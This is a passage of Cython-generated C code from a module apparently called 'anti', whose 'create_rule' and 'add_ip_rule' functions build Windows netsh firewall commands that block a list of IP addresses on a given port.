        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_stdout, __pyx_t_5) < 0) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_2, __pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_v__ = __pyx_t_5;
        __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_sleep); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 94, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_7, function);
            }
        }
        __pyx_t_5 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_2, __pyx_int_2) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_int_2);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 94, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Popen); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_show, __pyx_n_s_format); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_12 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
            __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_8);
            if (likely(__pyx_t_12)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_12);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
            }
        }
        __pyx_t_6 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_12, __pyx_t_11) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_11);
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = PyTuple_New(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
        __Pyx_GIVEREF(__pyx_t_6);
        PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_6);
        __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_stdout, __pyx_t_11) < 0) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_8, __pyx_t_6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_stdout); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_read); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_11);
            if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_11, function);
            }
        }
        __pyx_t_3 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_decode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_11);
            if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_11, function);
            }
        }
        __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_split); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_11);
            if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_11, function);
            }
        }
        __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_4, __pyx_kp_u__16) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_kp_u__16);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_GetItemInt(__pyx_t_2, 8, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
            }
        }
        __pyx_t_7 = (__pyx_t_11) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_11) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_7, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyUnicode_Replace(((PyObject*)__pyx_t_7), __pyx_kp_u_32, __pyx_kp_u__7, -1L); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u__3, __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyNumber_InPlaceAdd(__pyx_t_5, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_list_ban_ip, __pyx_t_2) < 0) __PYX_ERR(0, 95, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
            }
        }
        __pyx_t_2 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_kp_u__3) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u__3);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PySet_New(__pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PySequence_List(__pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyUnicode_Join(__pyx_kp_u__3, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_list_ban_ip, __pyx_t_2) < 0) __PYX_ERR(0, 96, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Popen); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_set_r, __pyx_n_s_format); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_11 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_7, function);
                __pyx_t_10 = 1;
            }
        }
#if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_7)) {
            PyObject* __pyx_temp[3] = { __pyx_t_4, __pyx_t_11, __pyx_t_3 };
            __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp + 1 - __pyx_t_10, 2 + __pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        else
#endif
#if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
                PyObject* __pyx_temp[3] = { __pyx_t_4, __pyx_t_11, __pyx_t_3 };
                __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp + 1 - __pyx_t_10, 2 + __pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)
                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            else
#endif
            {
                __pyx_t_6 = PyTuple_New(2 + __pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 97, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_6);
                if (__pyx_t_4) {
                    __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_4); __pyx_t_4 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_11);
                PyTuple_SET_ITEM(__pyx_t_6, 0 + __pyx_t_10, __pyx_t_11);
                __Pyx_GIVEREF(__pyx_t_3);
                PyTuple_SET_ITEM(__pyx_t_6, 1 + __pyx_t_10, __pyx_t_3);
                __pyx_t_11 = 0;
                __pyx_t_3 = 0;
                __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_6, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyTuple_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_5);
        __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_stdin, __pyx_t_6) < 0) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_stdout, __pyx_t_6) < 0) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_7, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 97, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF_SET(__pyx_v__, __pyx_t_6);
        __pyx_t_6 = 0;
    }
__pyx_L3:;
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_Popen); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_set_r_2, __pyx_n_s_format); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
        }
    }
    __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = PyTuple_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_5);
    __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_stdin, __pyx_t_2) < 0) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_stdout, __pyx_t_2) < 0) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_7, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF_SET(__pyx_v__, __pyx_t_2);
    __pyx_t_2 = 0;
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_11);
    __Pyx_XDECREF(__pyx_t_12);
    __Pyx_AddTraceback("anti.create_rule", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v__);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_15add_ip_rule(PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyMethodDef __pyx_mdef_4anti_15add_ip_rule = { "add_ip_rule", (PyCFunction)__pyx_pw_4anti_15add_ip_rule, METH_O, 0 };
static PyObject* __pyx_pw_4anti_15add_ip_rule(PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("add_ip_rule (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_14add_ip_rule(__pyx_self, ((PyObject*)__pyx_v_port));
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_14add_ip_rule(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port) {
    CYTHON_UNUSED PyObject* __pyx_v__ = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    Py_ssize_t __pyx_t_2;
    int __pyx_t_3;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    PyObject* __pyx_t_8 = NULL;
    int __pyx_t_9;
    PyObject* __pyx_t_10 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("add_ip_rule", 0);
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 101, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_2 == ((Py_ssize_t)-1))) __PYX_ERR(0, 101, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_3 = ((__pyx_t_2 < 0x1FAF) != 0);
    if (__pyx_t_3) {
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Popen); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_set_r, __pyx_n_s_format); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
